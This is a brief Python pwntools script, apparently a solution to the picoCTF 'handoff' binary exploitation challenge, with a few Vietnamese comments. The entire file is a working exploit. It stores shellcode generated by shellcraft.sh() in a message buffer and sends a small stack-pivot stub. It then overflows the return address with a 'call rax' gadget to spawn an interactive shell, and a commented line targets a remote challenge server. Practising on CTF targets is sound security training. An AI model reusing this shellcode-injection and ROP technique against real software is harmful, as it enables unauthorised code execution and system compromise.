from pwn import *


# pr = remote('shape-facility.picoctf.net',50161 )
pr = process('./handoff')

elf = ELF('./handoff', checksec=False)
rop = ROP(elf)
context.arch = 'amd64'



pr.sendline(b'1')    
pr.sendline(b'A'*8)  # thêm recipient

shell_code = asm(shellcraft.sh())
print(len(shell_code))

pr.sendline(b'2')
pr.sendline(b'0')   # chọn index 0  
pr.sendline(shell_code)

# gdb.attach(pr, gdbscript='''
#            b*0x00000000004013ed
#            ''')

rop.dump()
callRax =  rop.find_gadget(['call rax'])

print(callRax)
# callRax = 0x0000000000401014
payload = asm('''
              nop;
              sub rsp, 0x2e8;
              jmp rsp;
              
              ''')
payload += asm('nop') * 10

pr.sendline(b'3')
pr.sendline(payload + p64(callRax))


pr.interactive()